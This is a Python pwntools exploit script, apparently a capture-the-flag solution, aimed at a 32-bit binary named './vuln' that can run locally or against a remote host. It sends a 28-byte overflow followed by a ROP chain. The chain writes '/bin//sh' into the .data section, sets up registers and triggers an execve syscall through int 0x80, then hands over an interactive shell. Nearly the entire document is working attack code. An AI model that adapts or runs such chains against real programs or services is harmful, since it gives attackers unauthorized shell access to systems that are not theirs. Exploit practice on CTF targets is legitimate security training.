from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)

exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

offset = b'A' * 28
ropPayloads = offset
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5060) # @ .data
ropPayloads += flat(0x41414141) # padding
ropPayloads += flat(0x080b074a) # pop eax ; ret
ropPayloads += b'/bin'
ropPayloads += flat(0x08059102) # mov dword ptr [edx], eax ; ret
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5064) # @ .data + 4
ropPayloads += flat(0x41414141) # padding
ropPayloads += flat(0x080b074a) # pop eax ; ret
ropPayloads += b'//sh'
ropPayloads += flat(0x08059102) # mov dword ptr [edx], eax ; ret
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5068) # @ .data + 8
ropPayloads += flat(0x41414141) # padding
ropPayloads += flat(0x0804fb90) # xor eax, eax ; ret
ropPayloads += flat(0x08059102) # mov dword ptr [edx], eax ; ret
ropPayloads += flat(0x08049022) # pop ebx ; ret
ropPayloads += flat(0x080e5060) # @ .data
ropPayloads += flat(0x08049e39) # pop ecx ; ret
ropPayloads += flat(0x080e5068) # @ .data + 8
ropPayloads += flat(0x080583c9) # pop edx ; pop ebx ; ret
ropPayloads += flat(0x080e5068) # @ .data + 8
ropPayloads += flat(0x080e5060) # padding without overwrite ebx
ropPayloads += flat(0x0804fb90) # xor eax, eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0808055e) # inc eax ; ret
ropPayloads += flat(0x0804a3d2) # int 0x80

p = flat([
    ropPayloads
])

sh.sendline(p)
sh.interactive()
